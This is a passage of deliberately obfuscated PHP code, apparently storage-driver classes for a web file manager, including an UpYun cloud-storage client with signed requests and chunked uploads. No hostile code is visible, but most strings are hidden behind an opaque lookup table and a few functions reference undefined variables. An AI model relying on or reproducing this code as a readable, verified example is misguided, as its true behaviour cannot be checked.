$Ì—¨Ó÷[1697]); } public function size($íûœıî) { $¶œ“Ö·å = $this->objectMeta($íûœıî); return $¶œ“Ö·å ? $¶œ“Ö·å[$_SERVER[¤øïŠ‹²][90]] : 0; } public function info($†­ºĞ—) { if ($this->isFolder($†­ºĞ—)) { return $this->folderInfo($†­ºĞ—); } else { if ($this->isFile($†­ºĞ—)) { return $this->fileInfo($†­ºĞ—); } } return !1; } public function exist($öˆ™±ß¥) { return $this->isFile($öˆ™±ß¥) || $this->isFolder($öˆ™±ß¥); } public function isFile($ıµ­¿Ä¶) { return !$this->isFolder($ıµ­¿Ä¶) && $this->objectMeta($ıµ­¿Ä¶); } public function isFolder($ìêÃ£û”) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][190], $ìêÃ£û”); } protected function objectMeta($²°µñÕ) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][192], $²°µñÕ); } protected function _objectMeta($¦Î”ßÍ˜) { $¥°Éèç =& $_SERVER[¤øïŠ‹²]; list($¡õá§Ö«, $¸“ÑÌ¢Å) = $this->bucketManager->stat($this->bucket, $¦Î”ßÍ˜); if ($¡õá§Ö«) { $¡õá§Ö«[$¥°Éèç[90]] = intval($¡õá§Ö«[$¥°Éèç[1685]]); } return $¡õá§Ö«; } protected function _isFolder($ïÃÓ”Ã÷) { $Óì•ºœ =& $_SERVER[¤øïŠ‹²]; if ($ïÃÓ”Ã÷ == $Óì•ºœ[12] || $ïÃÓ”Ã÷ == $Óì•ºœ[8]) { return !0; } list($»©¯”‡Ÿ, $˜¬ºĞéä) = $this->bucketManager->listFiles($this->bucket, trim($ïÃÓ”Ã÷, $Óì•ºœ[8]) . $Óì•ºœ[8], $Óì•ºœ[12], 1, $Óì•ºœ[8]); return !empty($»©¯”‡Ÿ[$Óì•ºœ[1688]]) || !empty($»©¯”‡Ÿ[$Óì•ºœ[1689]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($€‘Òí÷¾, $°‰ÌÄ“Ã = 0) { parent::__construct(); $this->source = $€‘Òí÷¾; $this->sourceSize = $°‰ÌÄ“Ã; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($¶íšØ— = false) { return $this->sourceSize; } public function getContent($Âû–¡Öé = false) { return $this->fileSubstr($Âû–¡Öé, 0, $this->sourceSize); } public function fileSubstr($Çƒ–¬øÎ = false, $ä˜™ş¤û = 0, $ı¢æ ºÌ = 0) { if (!$ı¢æ ºÌ) { $ı¢æ ºÌ = $this->sourceSize; } $Ó Ä«Ø = $this->sourceSize - $ä˜™ş¤û; if ($ı¢æ ºÌ >= $Ó Ä«Ø) { $ı¢æ ºÌ = $Ó Ä«Ø; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ä˜™ş¤û, $ı¢æ ºÌ); } if ($this->sourceType == self::TYPE_FILE) { if ($ı¢æ ºÌ <= 0) { return $_SERVER[¤øïŠ‹²][12]; } $‚ı­Öæ‹ = ftell($this->source); fseek_64($this->source, $‚ı­Öæ‹ + $ä˜™ş¤û); $»Ğƒ¶ã³ = @fread($this->source, $ı¢æ ºÌ); fseek_64($this->source, $‚ı­Öæ‹); return $»Ğƒ¶ã³; } } public function hashMd5($¯ú›Ş³  = false) { return md5($this->getContent()); } public static function hash($£Õõ¸Èº, $ë¬ş…–± = 0) { $È²Š¶à§ = new PathDriverStream($£Õõ¸Èº, $ë¬ş…–±); return $È²Š¶à§->hashSimple($£Õõ¸Èº); } public static function md5($Íá¥Õ„ô, $ç¤œà—ß = 0) { $èõÄ³Ñû = new PathDriverStream($Íá¥Õ„ô, $ç¤œà—ß); return $èõÄ³Ñû->hashMd5($Íá¥Õ„ô); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\x3a\57\57\166\x30\x2e\141\x70\x69\x2e\x75\x70\x79\165\156\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¬“Èğ¹) { parent::__construct(); $this->_init($¬“Èğ¹); } public function _init($«ƒ‰¼Œ) { $Ï¨ç¸Õ =& $_SERVER[¤øïŠ‹²]; foreach ($«ƒ‰¼Œ as $®È†à· => $ƒ¿­Ÿ§Ø) { if (isset($this->{$®È†à·})) { $this->{$®È†à·} = $ƒ¿­Ÿ§Ø; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ï¨ç¸Õ[1698] . LNG($Ï¨ç¸Õ[1621])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÛùùæÃã, $‹ÉÁïµ = "\107\x45\124") { $¥çıÆÜª =& $_SERVER[¤øïŠ‹²]; $½„æĞ¥ = gmdate($¥çıÆÜª[1650]); $š µºÎÜ = base64_encode(hash_hmac($¥çıÆÜª[1699], "{$‹ÉÁïµ}\46{$ÛùùæÃã}\x26{$½„æĞ¥}", md5("{$this->userpass}"), !0)); $ı™¤”åÆ = array("\101\165\x74\150\x6f\162\151\x7a\x61\164\151\157\156\72\125\120\x59\x55\x4e\x20{$this->username}\x3a{$š µºÎÜ}", "\104\141\164\x65\x3a{$½„æĞ¥}"); return $ı™¤”åÆ; } public function ussRequest($Ÿ£Ï‡»², $‰•ÜÃÈ… = "\x47\105\x54", $ô“¿íıÑ = false, $™§ï¸­ = false, $Ù×Ù”È = false) { $°‡Áå«ç =& $_SERVER[¤øïŠ‹²]; $Ÿ£Ï‡»² = trim($Ÿ£Ï‡»², $°‡Áå«ç[8]); $Ê‹ë³Ãæ = "\x2f{$this->bucket}\57" . rawurlencode($Ÿ£Ï‡»²); $½†¢Õ…Õ = $this->ussHeaders($Ê‹ë³Ãæ, $‰•ÜÃÈ…); if ($™§ï¸­) { $½†¢Õ…Õ = array_merge($½†¢Õ…Õ, $™§ï¸­); } $“ß­¶ˆ = url_request($this->endpoint . $Ê‹ë³Ãæ, $‰•ÜÃÈ…, $ô“¿íıÑ, $½†¢Õ…Õ, $Ù×Ù”È); if (!$“ß­¶ˆ) { $¢ôÍøò = LNG($°‡Áå«ç[1700]); $this->writeLog($¢ôÍøò); return array($°‡Áå«ç[1349] => !1, $°‡Áå«ç[1339] => $¢ôÍøò); } if (strtolower($‰•ÜÃÈ…) == $°‡Áå«ç[240] || in_array($“ß­¶ˆ[$°‡Áå«ç[1349]], array($°‡Áå«ç[274], $°‡Áå«ç[1701]))) { $ô“¿íıÑ = $“ß­¶ˆ[$°‡Áå«ç[1702]]; if (!$“ß­¶ˆ[$°‡Áå«ç[851]]) { $ô“¿íıÑ = isset($ô“¿íıÑ[0]) ? $ô“¿íıÑ[0] : $°‡Áå«ç[12]; } } else { $ô“¿íıÑ = json_decode($“ß­¶ˆ[$°‡Áå«ç[1339]], !0); if (!$ô“¿íıÑ) { $ô“¿íıÑ = $“ß­¶ˆ[$°‡Áå«ç[1339]]; } else { if (!$“ß­¶ˆ[$°‡Áå«ç[851]] && isset($ô“¿íıÑ[$°‡Áå«ç[1703]])) { $ô“¿íıÑ = $ô“¿íıÑ[$°‡Áå«ç[1703]]; } } } if (!$“ß­¶ˆ[$°‡Áå«ç[851]]) { $this->writeLog($this->__errorMessage($ô“¿íıÑ)); } return array($°‡Áå«ç[1349] => $“ß­¶ˆ[$°‡Áå«ç[851]], $°‡Áå«ç[1339] => $ô“¿íıÑ); } private function __errorMessage($Â²·ïÇÈ) { $˜ŸõºËß =& $_SERVER[¤øïŠ‹²]; if (!$Â²·ïÇÈ) { return $˜ŸõºËß[12]; } static $©ªó = null; if (!$©ªó) { $©ªó = I18n::getType(); } if ($©ªó != $˜ŸõºËß[1658]) { return $Â²·ïÇÈ; } $µ™öˆü‡ = array($˜ŸõºËß[1704] => $˜ŸõºËß[1705], $˜ŸõºËß[1706] => $˜ŸõºËß[1707], $˜ŸõºËß[1708] => $˜ŸõºËß[1707], $˜ŸõºËß[1709] => $˜ŸõºËß[1710], $˜ŸõºËß[1711] => $˜ŸõºËß[1712], $˜ŸõºËß[1713] => $˜ŸõºËß[1714], $˜ŸõºËß[1715] => $˜ŸõºËß[1716]); return isset($µ™öˆü‡[$Â²·ïÇÈ]) ? $µ™öˆü‡[$Â²·ïÇÈ] : $Â²·ïÇÈ; } public function mkfile($èšÒ§ş, $ÙöÅšŸÎ = '', $ò¶èÉ®‹ = REPEAT_RENAME) { if ($this->setContent($èšÒ§ş, $ÙöÅšŸÎ)) { return $this->getPathOuter($èšÒ§ş); } return !1; } public function mkdir($–£³ıı¬, $¬¦„¿¾ï = REPEAT_SKIP) { $±ßåšà =& $_SERVER[¤øïŠ‹²]; $‘‡­ ‚Ğ = trim($–£³ıı¬, $±ßåšà[8]); if ($this->_isFolder($‘‡­ ‚Ğ)) { return $this->getPathOuter($‘‡­ ‚Ğ); } $äûıö = array($±ßåšà[1717]); $éÛ˜ïÖ¦ = $this->ussRequest($‘‡­ ‚Ğ, $±ßåšà[300], !1, $äûıö); return $éÛ˜ïÖ¦[$±ßåšà[1349]] ? $this->getPathOuter($‘‡­ ‚Ğ) : !1; } public function copyFile($ÙÀÆ¼Ğè, $Î™Ç÷Ÿ) { $»¢¨¶™ì =& $_SERVER[¤øïŠ‹²]; $à¶³Ã = array($»¢¨¶™ì[1718] . "\57{$this->bucket}\57{$ÙÀÆ¼Ğè}", $»¢¨¶™ì[1719]); $á§Ğïô = $this->ussRequest($Î™Ç÷Ÿ, $»¢¨¶™ì[266], !1, $à¶³Ã); return $á§Ğïô[$»¢¨¶™ì[1349]] ? !0 : $this->getPathOuter($Î™Ç÷Ÿ); } public function moveFile($ğ®áñ“¯, $»Æ˜Ïü) { $¤˜´Ê€§ =& $_SERVER[¤øïŠ‹²]; $ùÓ¦Ñ¼Ù = array($¤˜´Ê€§[1720] . "\57{$this->bucket}\57{$ğ®áñ“¯}", $¤˜´Ê€§[1719]); $ÄåàÏ¦¤ = $this->ussRequest($»Æ˜Ïü, $¤˜´Ê€§[266], !1, $ùÓ¦Ñ¼Ù); return $ÄåàÏ¦¤[$¤˜´Ê€§[1349]] ? !0 : $this->getPathOuter($»Æ˜Ïü); } public function delFile($Ã…Óí®¼) { $Øá›¹«ø =& $_SERVER[¤øïŠ‹²]; $ÓŒôÛŠ¡ = $this->ussRequest($Ã…Óí®¼, $Øá›¹«ø[1721]); return $ÓŒôÛŠ¡[$Øá›¹«ø[1349]] ? !0 : !1; } public function delFolder($ê×Õ°·) { $ïÀ¡ùƒä =& $_SERVER[¤øïŠ‹²]; if (!$this->exist($ê×Õ°·)) { return !0; } $this->listItemCache = !1; $œì¬÷’ = $ÒİÛÓ› = array(); $this->fileList($ê×Õ°·, $œì¬÷’, $ÒİÛÓ›, !0); $this->listItemCache = !0; foreach ($ÒİÛÓ› as $ªµê‹Ô) { $¦ˆ•ğŞˆ = $this->ussRequest($ªµê‹Ô[$ïÀ¡ùƒä[32]], $ïÀ¡ùƒä[1721]); if (!$¦ˆ•ğŞˆ[$ïÀ¡ùƒä[1349]]) { return !1; } } usort($œì¬÷’, function ($Ò«´¢¨é, $´–ƒÜòµ) { $Å¬ëÕÑ =& $_SERVER[¤øïŠ‹²]; return substr_count($´–ƒÜòµ, $Å¬ëÕÑ[8]) - substr_count($Ò«´¢¨é, $Å¬ëÕÑ[8]); }); foreach ($œì¬÷’ as $ÌìñíáÒ) { $¦ˆ•ğŞˆ = $this->ussRequest($ÌìñíáÒ, $ïÀ¡ùƒä[1721]); if (!$¦ˆ•ğŞˆ[$ïÀ¡ùƒä[1349]]) { return !1; } } $¦ˆ•ğŞˆ = $this->ussRequest($ê×Õ°·, $ïÀ¡ùƒä[1721]); return $¦ˆ•ğŞˆ[$ïÀ¡ùƒä[1349]]; } public function rename($Ó×Ã–½˜, $¡¾Ï×Ô¿) { if ($this->isFile($Ó×Ã–½˜)) { $¡¾Ï×Ô¿ = get_path_father($Ó×Ã–½˜) . $¡¾Ï×Ô¿; return $this->moveFile($Ó×Ã–½˜, $¡¾Ï×Ô¿); } return $this->renameObject($Ó×Ã–½˜, $¡¾Ï×Ô¿); } public function fileInfo($ãØ•¤•, $²Ê›’Ö = false, $öŒ¨‹æ = array()) { $º¯Ş„óœ =& $_SERVER[¤øïŠ‹²]; $€¾Şï®Ÿ = array($º¯Ş„óœ[32] => $this->pathThis($ãØ•¤•), $º¯Ş„óœ[98] => $this->getPathOuter($º¯Ş„óœ[8] . $ãØ•¤•), $º¯Ş„óœ[33] => $º¯Ş„óœ[243], $º¯Ş„óœ[90] => isset($öŒ¨‹æ[$º¯Ş„óœ[90]]) ? $öŒ¨‹æ[$º¯Ş„óœ[90]] : 0, $º¯Ş„óœ[179] => $this->ext($ãØ•¤•)); if ($²Ê›’Ö) { return $€¾Şï®Ÿ; } $€¾Şï®Ÿ[$º¯Ş„óœ[244]] = $€¾Şï®Ÿ[$º¯Ş„óœ[99]] = 0; $€¾Şï®Ÿ[$º¯Ş„óœ[245]] = $€¾Şï®Ÿ[$º¯Ş„óœ[246]] = !0; if (empty($öŒ¨‹æ)) { $öŒ¨‹æ = $this->objectMeta($ãØ•¤•); if (!$öŒ¨‹æ) { return $€¾Şï®Ÿ; } } $€¾Şï®Ÿ[$º¯Ş„óœ[244]] = intval($öŒ¨‹æ[$º¯Ş„óœ[1722]]); $€¾Şï®Ÿ[$º¯Ş„óœ[99]] = intval($öŒ¨‹æ[$º¯Ş„óœ[1723]]); $€¾Şï®Ÿ[$º¯Ş„óœ[90]] = $öŒ¨‹æ[$º¯Ş„óœ[90]]; return $€¾Şï®Ÿ; } public function folderInfo($¸®£ĞÙ, $–ÑÊÙäü = false) { $û‰µ·õ =& $_SERVER[¤øïŠ‹²]; $ü—óĞ÷Ã = array($û‰µ·õ[32] => $this->pathThis($¸®£ĞÙ), $û‰µ·õ[98] => $this->getPathOuter($û‰µ·õ[8] . $¸®£ĞÙ), $û‰µ·õ[33] => $û‰µ·õ[89]); if ($–ÑÊÙäü) { return $ü—óĞ÷Ã; } $ü—óĞ÷Ã[$û‰µ·õ[244]] = $ü—óĞ÷Ã[$û‰µ·õ[99]] = 0; $ü—óĞ÷Ã[$û‰µ·õ[245]] = $ü—óĞ÷Ã[$û‰µ·õ[246]] = !0; if (empty($˜’ßˆŒ )) { $˜’ßˆŒ  = $this->objectMeta($¸®£ĞÙ); if (!$˜’ßˆŒ ) { return $ü—óĞ÷Ã; } } $ü—óĞ÷Ã[$û‰µ·õ[244]] = intval($˜’ßˆŒ [$û‰µ·õ[1722]]); $ü—óĞ÷Ã[$û‰µ·õ[99]] = intval($˜’ßˆŒ [$û‰µ·õ[1723]]); return $ü—óĞ÷Ã; } private function listObjs($Ú¡èˆ½Ş, $¢´ˆ¥œ± = 0, $ÇÎéİúû = 1000) { $¢‘½ Ğ =& $_SERVER[¤øïŠ‹²]; $¿÷³ê±ë = array($¢‘½ Ğ[1724], $¢‘½ Ğ[1725] . $ÇÎéİúû); if ($¢´ˆ¥œ±) { $¿÷³ê±ë[] = $¢‘½ Ğ[1726] . $¢´ˆ¥œ±; } $Ë´³ùÅç = $this->ussRequest($Ú¡èˆ½Ş, $¢‘½ Ğ[1555], !1, $¿÷³ê±ë); return !$Ë´³ùÅç[$¢‘½ Ğ[1349]] ? !1 : $Ë´³ùÅç[$¢‘½ Ğ[1339]]; } private function fileList($×œø´, &$²ÍË³ñ¼, &$½¤„ ï†, $÷¥Ø¬‰Æ = false) { $áïéĞÉ­ =& $_SERVER[¤øïŠ‹²]; $Ò¾Ì — = $áïéĞÉ­[12]; $¢ÖîÕŒ´ = 1000; $ŸŒ¸Õà = rtrim($×œø´, $áïéĞÉ­[8]) . $áïéĞÉ­[8]; while (!0) { check_abort(); $ÈâÍÇÑ = $this->listObjs($×œø´, $Ò¾Ì —, $¢ÖîÕŒ´); if (!$ÈâÍÇÑ) { return !1; } $Ò¾Ì — = isset($ÈâÍÇÑ[$áïéĞÉ­[1727]]) ? $ÈâÍÇÑ[$áïéĞÉ­[1727]] : $áïéĞÉ­[12]; $ú–ş§œ‘ = isset($ÈâÍÇÑ[$áïéĞÉ­[1728]]) ? $ÈâÍÇÑ[$áïéĞÉ­[1728]] : array(); foreach ($ú–ş§œ‘ as $×¸û¦‹) { $ÉçûØıµ = $×¸û¦‹[$áïéĞÉ­[33]] == $áïéĞÉ­[89] ? !0 : !1; $œ‡½òÒÑ = ltrim($ŸŒ¸Õà . $×¸û¦‹[$áïéĞÉ­[32]], $áïéĞÉ­[8]) . ($ÉçûØıµ ? $áïéĞÉ­[8] : $áïéĞÉ­[12]); $ÄÈ¤‹ø  = array($áïéĞÉ­[32] => $œ‡½òÒÑ, $áïéĞÉ­[33] => $ÉçûØıµ ? $áïéĞÉ­[89] : $áïéĞÉ­[243], $áïéĞÉ­[90] => $×¸û¦‹[$áïéĞÉ­[424]], $áïéĞÉ­[1723] => $×¸û¦‹[$áïéĞÉ­[1729]]); $this->cacheMethodInfoSet($œ‡½òÒÑ, $ÉçûØıµ, $ÄÈ¤‹ø ); if ($ÉçûØıµ) { $²ÍË³ñ¼[] = $œ‡½òÒÑ; if ($÷¥Ø¬‰Æ) { $this->fileList($œ‡½òÒÑ, $²ÍË³ñ¼, $½¤„ ï†, $÷¥Ø¬‰Æ); } continue; } $½¤„ ï†[] = $ÄÈ¤‹ø ; } if (count($ú–ş§œ‘) < $¢ÖîÕŒ´) { break; } } $this->cacheMethodInfoSet($×œø´, !0); } public function listPath($¸ÀíØ©Š, $¨»‘œ›· = false) { $¡áĞšèã =& $_SERVER[¤øïŠ‹²]; $¿÷ä½ù = $°œ³˜ù‚ = array(); $this->fileList($¸ÀíØ©Š, $¿÷ä½ù, $°œ³˜ù‚); foreach ($¿÷ä½ù as $œ¼û£ª‹ => $Úµá”ëæ) { $¿÷ä½ù[$œ¼û£ª‹] = $this->folderInfo($Úµá”ëæ, $¨»‘œ›·); } foreach ($°œ³˜ù‚ as $œ¼û£ª‹ => $Úµá”ëæ) { $°œ³˜ù‚[$œ¼û£ª‹] = $this->fileInfo($Úµá”ëæ[$¡áĞšèã[32]], $¨»‘œ›·, $Úµá”ëæ); } return array($¡áĞšèã[96] => $¿÷ä½ù, $¡áĞšèã[97] => $°œ³˜ù‚); } public function has($„ª§¢€¥, $ˆÄÄª = false, $ìšøë­ = true) { $³øèŠĞÙ =& $_SERVER[¤øïŠ‹²]; $¦¯Âå«¥ = $³øèŠĞÙ[12]; $·¤¾‡Ä = 500; $Ö°¦ƒ‹¨ = 0; $ÑÜ…½» = 0; $ÎûØ“Ÿ = rtrim($„ª§¢€¥, $³øèŠĞÙ[8]) . $³øèŠĞÙ[8]; while (!0) { check_abort(); $«î½Èƒ = $this->listObjs($„ª§¢€¥, $¦¯Âå«¥, $·¤¾‡Ä); if (!$«î½Èƒ) { return !1; } $¦¯Âå«¥ = isset($«î½Èƒ[$³øèŠĞÙ[1727]]) ? $«î½Èƒ[$³øèŠĞÙ[1727]] : $³øèŠĞÙ[12]; $ï¨€÷ = isset($«î½Èƒ[$³øèŠĞÙ[1728]]) ? $«î½Èƒ[$³øèŠĞÙ[1728]] : array(); if (empty($ï¨€÷)) { break; } $äÑ¶ê§ = array_filter($ï¨€÷, function ($½ëä†Éµ) { $Ä¿ƒÇıš =& $_SERVER[¤øïŠ‹²]; return $½ëä†Éµ[$Ä¿ƒÇıš[33]] == $Ä¿ƒÇıš[89]; }); $ˆ¿½“ŠŸ = count($ï¨€÷); $äÑ¶ê§ = count($äÑ¶ê§); $é·€îé = $ˆ¿½“ŠŸ - $äÑ¶ê§; if ($ˆÄÄª) { $ÑÜ…½» += $äÑ¶ê§; $Ö°¦ƒ‹¨ += $é·€îé; if ($ˆ¿½“ŠŸ < $·¤¾‡Ä) { break; } continue; } if ($ìšøë­) { if ($é·€îé) { return !0; } } else { if ($äÑ¶ê§) { return !0; } } if ($ˆ¿½“ŠŸ < $·¤¾‡Ä) { break; } } if ($ˆÄÄª) { return array($³øèŠĞÙ[252] => $Ö°¦ƒ‹¨, $³øèŠĞÙ[253] => $ÑÜ…½»); } return !1; } public function listAll($Ò”²€à) { $ı×µ¾Ó =& $_SERVER[¤øïŠ‹²]; $¶‹Ïö–Ï = $ì«”ÈÍ = array(); $this->fileList($Ò”²€à, $¶‹Ïö–Ï, $ì«”ÈÍ, !0); $’êÈ‰ñÆ = array_to_keyvalue($ì«”ÈÍ, $ı×µ¾Ó[32]); foreach ($¶‹Ïö–Ï as $Ï÷­»à¼) { if (is_string($Ï÷­»à¼)) { $’êÈ‰ñÆ[$Ï÷­»à¼] = array($ı×µ¾Ó[90] => 0); } } return $this->listAllFiles($Ò”²€à, $’êÈ‰ñÆ); } public function canRead($‹¢£”È¦) { return $this->exist($‹¢£”È¦) ? !0 : !1; } public function canWrite($ë«à¬÷) { return $this->exist($ë«à¬÷) ? !0 : !1; } public function getContent($ô¦ì†‰×) { return $this->fileSubstr($ô¦ì†‰×, 0, -1); } public function setContent($»ß¸ÕÖ«, $¢¨“ıÌ¦ = '') { $¯ù²„Şş =& $_SERVER[¤øïŠ‹²]; if (!$¢¨“ıÌ¦) { $á‰½÷™ = $this->ussRequest($»ß¸ÕÖ«, $¯ù²„Şş[300]); return $á‰½÷™[$¯ù²„Şş[1349]]; } $õ¬ÀµĞô = $this->tempFile($this->pathThis($»ß¸ÕÖ«)); file_put_contents($õ¬ÀµĞô, $¢¨“ıÌ¦); if ($this->upload($»ß¸ÕÖ«, $õ¬ÀµĞô)) { $this->tempFileRemve($õ¬ÀµĞô); return !0; } return !1; } public function fileSubstr($Œ’¸›³, $şçä¡±, $€‰²ûò) { $ø—ï»ç¯ =& $_SERVER[¤øïŠ‹²]; if (!($Û‘Œ¢„» = $this->link($Œ’¸›³))) { return !1; } $±ÖËù™ = !1; if ($€‰²ûò > 0) { $©Óñ¸‘± = $şçä¡± + $€‰²ûò - 1; $±ÖËù™ = array($ø—ï»ç¯[1554] . $şçä¡± . $ø—ï»ç¯[483] . $©Óñ¸‘±); } $²ïÕ‚ûñ = url_request($Û‘Œ¢„», $ø—ï»ç¯[1555], !1, $±ÖËù™); return $²ïÕ‚ûñ[$ø—ï»ç¯[851]] ? $²ïÕ‚ûñ[$ø—ï»ç¯[1339]] : !1; } public function upload($¼ÖîõÜ•, $…éï“ºõ, $µõ´ñûİ = false, $µú£á†ò = REPEAT_REPLACE) { $‚±šÁÕ =& $_SERVER[¤øïŠ‹²]; if (!$…éï“ºõ || !@file_exists($…éï“ºõ)) { return !1; } $õÙú¹Á› = IO::size($…éï“ºõ); if ($õÙú¹Á› <= 1024 * 1024 * 200) { $¨£Ş¿ß = array($‚±šÁÕ[1730] . $…éï“ºõ); $Šôè™–ö = $this->ussRequest($¼ÖîõÜ•, $‚±šÁÕ[266], $¨£Ş¿ß); return $Šôè™–ö[$‚±šÁÕ[1349]] ? $this->getPathOuter($¼ÖîõÜ•) : !1; } $š†ü¼äí = 1024 * 1024 * 10; $í˜©í»º = array($‚±šÁÕ[1731], $‚±šÁÕ[1732] . $õÙú¹Á›, $‚±šÁÕ[1733], $‚±šÁÕ[1734] . $š†ü¼äí); $Šôè™–ö = $this->ussRequest($¼ÖîõÜ•, $‚±šÁÕ[266], !1, $í˜©í»º); if (!$Šôè™–ö[$‚±šÁÕ[1349]]) { return !1; } $¸‰É¬Í = $Šôè™–ö[$‚±šÁÕ[1339]]; $‹İ†²ÅŒ = 0; $¾ìªˆÉ¡ = $¸‰É¬Í[$‚±šÁÕ[1735]]; $…şËÄã– = fopen($…éï“ºõ, $‚±šÁÕ[1615]); if (!$…şËÄã–) { return !1; } do { $Ë¿»«¦– = $¸‰É¬Í[$‚±šÁÕ[1736]]; fseek_64($…şËÄã–, $‹İ†²ÅŒ); $ªº…¸¤œ = fread($…şËÄã–, $Ë¿»«¦–); $‘Ô¡Ó²Ï = 0; do { $‘Ô¡Ó²Ï++; $¸‰É¬Í = $this->uploadPart($¼ÖîõÜ•, $¸‰É¬Í, $ªº…¸¤œ); } while (!$¸‰É¬Í && $‘Ô¡Ó²Ï < 3); if (!$¸‰É¬Í) { return !1; } $¾ìªˆÉ¡ = $¸‰É¬Í[$‚±šÁÕ[1735]]; $‹İ†²ÅŒ += $Ë¿»«¦–; } while ($¾ìªˆÉ¡ != -1); fclose($…şËÄã–); $í˜©í»º = array($‚±šÁÕ[1737], $‚±šÁÕ[1738] . $¸‰É¬Í[$‚±šÁÕ[1739]], $‚±šÁÕ[1733]); $Šôè™–ö = $this->ussRequest($¼ÖîõÜ•, $‚±šÁÕ[266], !1, $í˜©í»º); return $Šôè™–ö[$‚±šÁÕ[1349]] ? $this->getPathOuter($°Ö®«´Ú) : !1; } private function uploadPart($¸³ü…×ƒ, $Òé¹¯, &$’ÆÑ·ë‡) { $Éû“×Çğ =& $_SERVER[¤øïŠ‹²]; $Â›ñƒ¹… = array($Éû“×Çğ[1740], $Éû“×Çğ[1738] . $Òé¹¯[$Éû“×Çğ[1739]], $Éû“×Çğ[1741] . $Òé¹¯[$Éû“×Çğ[1735]], $Éû“×Çğ[156] . $Òé¹¯[$Éû“×Çğ[1736]]); $ğÃÌ’¾  = $this->ussRequest($¸³ü…×ƒ, $Éû“×Çğ[266], $’ÆÑ·ë‡, $Â›ñƒ¹…); return !$ğÃÌ’¾ [$Éû“×Çğ[1349]] ? $ğÃÌ’¾ [$Éû“×Çğ[1349]] : $ğÃÌ’¾ [$Éû“×Çğ[1339]]; } public function uploadFormData($…¦ û™Ó, $û£šÎÚ = 3600) { return $this->uploadPolicy($…¦ û™Ó, $û£šÎÚ); } public function uploadMultiData($ËÒô¡¡“, $—Ã•„üÅ = 3600) { $¥·Ì‘ª =& $_SERVER[¤øïŠ‹²]; $Ëüøë©ô = (int) $GLOBALS[$¥·Ì‘ª[7]][$¥·Ì‘ª[90]]; return $this->uploadPolicy($ËÒô¡¡“, $—Ã•„üÅ, $Ëüøë©ô); } private function uploadPolicy($Ğé±Ü³ì, $°ÉÌöùè = 3600, $›ü‘æ† = 0) { $Ô”™„²¢ =& $_SERVER[¤øïŠ‹²]; $›Í ¹ç = $Ô”™„²¢[8] . $this->bucket; $¶’°†º× = gmdate($Ô”™„²¢[1650]); $ÍåĞã˜¢ = array($Ô”™„²¢[1742] => $this->bucket, $Ô”™„²¢[1743] => $Ğé±Ü³ì, $Ô”™„²¢[1744] => time() + $°ÉÌöùè, $Ô”™„²¢[1745] => $¶’°†º×); if ($›ü‘æ†) { $ÍåĞã˜¢[$Ô”™„²¢[1635]] = $›ü‘æ†; } $ß’Á±ÖÉ = base64_encode(json_encode($ÍåĞã˜¢)); $›Ÿıâü¦ = base64_encode(hash_hmac($Ô”™„²¢[1699], "\x50\117\x53\x54\x26{$›Í ¹ç}\x26{$¶’°†º×}\46{$ß’Á±ÖÉ}", md5("{$this->userpass}"), !0)); $üëš = array($Ô”™„²¢[290] => $ß’Á±ÖÉ, $Ô”™„²¢[1746] => "\125\120\x59\x55\x4e\x20{$this->username}\72{$›Ÿıâü¦}", $Ô”™„²¢[219] => $this->endpoint . $›Í ¹ç); return $üëš; } public function download($Ä«­ŸÑ, $ÈÊ¬Äß) { $ÆâÀĞñš = IO::getPathInner(IO::mkfile($ÈÊ¬Äß)); if (!($§¿É¶°ö = $this->link($Ä«­ŸÑ))) { return !1; } $á¸Õê¯Ø = 0; $ÂÓê¯Ÿæ = 1024 * 200; $¹±±Ş‡ = fopen($ÆâÀĞñš, $_SERVER[¤øïŠ‹²][1694]); while (!0) { $…³Äª… = $this->fileSubstr($Ä«­ŸÑ, $á¸Õê¯Ø, $ÂÓê¯Ÿæ); if ($…³Äª… === !1) { return !1; } fwrite($¹±±Ş‡, $…³Äª…); $á¸Õê¯Ø += $ÂÓê¯Ÿæ; if (strlen($…³Äª…) < $ÂÓê¯Ÿæ) { break; } } fclose($¹±±Ş‡); return $ÈÊ¬Äß; } public function link($¢Øœõ•î, $í™ü‚… = array()) { $›ÂûûŠ =& $_SERVER[¤øïŠ‹²]; $¢Øœõ•î = trim($¢Øœõ•î, $›ÂûûŠ[8]); if (!empty($this->token)) { $ÁÑ½‚Œê = strtotime(date($›ÂûûŠ[1747])); $Š÷œ—¾¤ = substr(md5($this->token . $›ÂûûŠ[297] . $ÁÑ½‚Œê . $›ÂûûŠ[1748] . $¢Øœõ•î), 12, 8) . $ÁÑ½‚Œê; $í™ü‚…[] = $›ÂûûŠ[1749] . $Š÷œ—¾¤; } $Øè½ªóò = !empty($í™ü‚…) ? $›ÂûûŠ[87] . implode($›ÂûûŠ[297], $í™ü‚…) : $›ÂûûŠ[12]; return $this->getHost() . $›ÂûûŠ[8] . $this->pathEncode($¢Øœõ•î) . $Øè½ªóò; } public function fileOut($ïíòç, $Ÿ×ğ¹ = false, $è÷ƒĞş = false, $»­É¯¬ç = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ïíòç, $Ÿ×ğ¹, $è÷ƒĞş, $»­É¯¬ç); } if (!$è÷ƒĞş) { $è÷ƒĞş = $this->pathThis($ïíòç); } $Úåâà‡¤ = $Ÿ×ğ¹ ? array($_SERVER[¤øïŠ‹²][1750] . rawurlencode($è÷ƒĞş)) : array(); $½è—ª·¼ = $this->link($ïíòç, $Úåâà‡¤); $this->fileOutLink($½è—ª·¼); } public function fileOutServer($ƒíÑ«ã™, $úÆÜéÎ³ = false, $³ĞŸ‰·£ = false, $ÎÒÜê‚ = '') { parent::fileOut($ƒíÑ«ã™, $úÆÜéÎ³, $³ĞŸ‰·£, $ÎÒÜê‚); } public function fileOutImage($¬ÌûÒÄä, 